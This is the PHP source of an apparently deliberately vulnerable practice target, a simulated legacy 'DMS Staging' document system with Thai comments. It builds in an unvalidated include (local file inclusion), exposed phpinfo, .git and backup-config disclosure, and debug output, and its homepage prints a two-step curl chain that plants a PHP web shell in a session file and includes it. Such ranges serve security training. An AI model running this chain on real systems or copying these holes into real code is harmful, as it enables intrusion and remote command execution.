<?php
/**
 * LAB TARGET #7 - กลุ่มที่ 7: ระบบทดสอบ ระบบเก่า และระบบสำรอง (Dev / UAT / Staging / DR)
 * Simulated product: "DMS Staging" (Internal Document Management, build 2018) on PHP 5.6-style code
 * Weakness: debug mode left on, phpinfo + .git + backup config exposed, dynamic include (LFI),
 *           and session.upload_progress enabled with cleanup off -> write PHP into session file,
 *           then include it = classic PHP2Shell chain without any file upload.
 * LISTEN: 8087
 */
require __DIR__ . '/../../common/lab.php';

header('X-Powered-By: PHP/5.6.40');
header('Server: Apache/2.2.15 (CentOS)');
ini_set('display_errors', '1');
ini_set('display_startup_errors', '1');
ini_set('html_errors', '1');
ini_set('session.save_path', '/tmp');
ini_set('session.use_strict_mode', '0');
error_reporting(E_ALL);
session_start();

const APP_NAME = 'DMS Staging';
const BUILD    = '2018.11.07-staging';
$PORT = 8087;

$path = parse_url($_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH) ?: '/';
$path = rawurldecode($path);

if ($path === '/health') {
    lab_health([
        'system' => 'legacy-staging',
        'group'  => 7,
        'group_name' => 'ระบบทดสอบ/ระบบเก่า/ระบบสำรอง (Dev/UAT/Staging/DR)',
        'port'   => $PORT,
        'product'=> APP_NAME . ' ' . BUILD,
        'php'    => '5.6.40',
        'vuln'   => 'debug-exposure / phpinfo / git / LFI + session-upload-progress chain',
        'session_save_path' => ini_get('session.save_path'),
        'upload_progress'   => ini_get('session.upload_progress.enabled'),
    ]);
}

/* ------------------------- phpinfo (exposure) ---------------------- */
if ($path === '/phpinfo.php') {
    phpinfo();
    exit;
}

/* ---------------------- VCS + backup disclosure -------------------- */
if ($path === '/.git/HEAD') { header('Content-Type: text/plain'); echo "ref: refs/heads/staging\n"; exit; }
if ($path === '/.git/config') {
    header('Content-Type: text/plain; charset=utf-8');
    echo "[core]\n\trepositoryformatversion = 0\n\tbare = false\n[remote \"origin\"]\n\turl = git@gitlab.example.internal:ops/dms.git\n";
    echo "[user]\n\tname = deploy\n\temail = deploy@example.internal\n";
    exit;
}
if (preg_match('#^/backup/(.+)$#', $path, $m)) {
    lab_download(__DIR__ . '/backup/' . basename($m[1]));
}
if ($path === '/.env' || $path === '/config.old.php') {
    lab_download(__DIR__ . '/backup/config.old.txt');
}

/* --------------- LFI: dynamic include with no whitelist ------------
 * GET /?page=home  หรือ  ?page=/etc/passwd  หรือ ?page=/tmp/sess_<sid>
 * ------------------------------------------------------------------ */
if (isset($_GET['page'])) {
    $page = $_GET['page'];
    ob_start();
    include $page;                       // <-- unvalidated include
    $included = ob_get_clean();
    lab_page('DMS Staging - viewer', 'โมดูลแสดงหน้าเอกสาร (include แบบไดนามิก)', 'TARGET #7 · LEGACY STAGING · PORT 8087 · debug mode ON', 'red',
        '<div class="card"><h2>Requested page</h2>
          <p class="mono">' . h($page) . '</p>
          <p class="sub">resolved from: /var/www/staging/</p>
          <pre>' . h($included !== '' ? $included : '(include produced no output)') . '</pre>
          <p style="margin-top:8px"><a href="/?page=home">?page=home</a> &middot; <a href="/?page=/etc/passwd">?page=/etc/passwd</a></p>
        </div>');
}

/* ----------------------- forced error (debug mode) ----------------- */
if ($path === '/debug/trigger') {
    $undefined = $notDefinedVar;      // warning
    echo $undefined;
    trigger_error('staging debug endpoint: stack trace enabled', E_USER_WARNING);
    exit;
}

/* ------------------------- session upload progress -----------------
 * PHP เขียนข้อมูล progress ลง /tmp/sess_<PHPSESSID> โดยไม่กรองเนื้อหา
 * เมื่อรวมกับ LFI ด้านบน -> สั่งรันโค้ดได้โดยไม่ต้องอัปโหลดไฟล์
 * ------------------------------------------------------------------ */
if ($path === '/upload_progress.php') {
    $_SESSION['last_progress_key'] = $_POST['PHP_SESSION_UPLOAD_PROGRESS'] ?? null;
    lab_json([
        'session_id' => session_id(),
        'session_file' => session_save_path() . '/sess_' . session_id(),
        'progress_key' => $_SESSION['last_progress_key'],
        'note' => 'session.upload_progress.enabled=On, cleanup=Off -> attacker data persists in the session file',
    ]);
}

if ($path === '/file_list.php') {
    lab_json(['files' => array_map(fn($f) => basename($f), glob(__DIR__ . '/*'))]);
}

/* ------------------------------- homepage --------------------------- */
$homeHtml = is_file(__DIR__ . '/pages/home.php') ? 'Document Management System &mdash; staging build ' . BUILD : '';
$sessionFile = session_save_path() . '/sess_' . session_id();

lab_page(
    'DMS Staging &mdash; Internal Document Management',
    'ระบบจัดการเอกสารภายใน (environments: staging / UAT / DR) build ' . BUILD . ' ไม่ได้อัปเดตแพตช์ตั้งแต่ปี 2018',
    'TARGET #7 · LEGACY / STAGING · PORT 8087 · debug mode ON',
    'red',
    '<div class="card"><h2>Environment</h2><div class="grid">
        <div class="tile"><b>Build</b>' . BUILD . '</div>
        <div class="tile"><b>Mode</b>debug / display_errors On</div>
        <div class="tile"><b>PHP</b>5.6.40</div>
        <div class="tile"><b>Session path</b>' . h(session_save_path()) . '</div>
     </div>
     <p class="sub" style="margin-top:10px">ผู้ใช้ปัจจุบัน session file: <code>' . h($sessionFile) . '</code></p></div>
     <div class="card"><h2>Endpoints</h2><table><tbody>
       <tr><td class="mono">GET /?page=home</td><td>โมดูลแสดงหน้า (include ไดนามิก)</td></tr>
       <tr><td class="mono">GET /phpinfo.php</td><td>phpinfo() เต็มรูปแบบ</td></tr>
       <tr><td class="mono">GET /.git/HEAD, /.git/config</td><td>ซอร์สโค้ดและ remote ที่ยังค้างอยู่</td></tr>
       <tr><td class="mono">GET /backup/config.old.txt</td><td>ไฟล์ตั้งค่าเก่า (รหัสผ่านฐานข้อมูล)</td></tr>
       <tr><td class="mono">GET /debug/trigger</td><td>เปิดเผย stack trace / path ภายใน</td></tr>
       <tr><td class="mono">POST /upload_progress.php</td><td>เขียน progress ลงไฟล์ session</td></tr>
     </tbody></table></div>
     <div class="card"><h2>Session upload progress chain</h2>
       <pre># 1) เขียน PHP ลง session file ผ่าน progress key
curl -s -b "PHPSESSID=lab7" -F "PHP_SESSION_UPLOAD_PROGRESS=&lt;?php system($_GET[c]); ?&gt;" \\
     -F "f=@/etc/hostname" http://HOST:8087/upload_progress.php

# 2) สั่ง include ไฟล์ session นั้น
curl "http://HOST:8087/?page=/tmp/sess_lab7&amp;c=id"</pre>
     </div>
     <div class="card"><h2>Document viewer</h2>
       <form method="get" action="/">
         <p><input type="text" name="page" value="home"></p><button>Open page</button>
       </form>
     </div>'
);
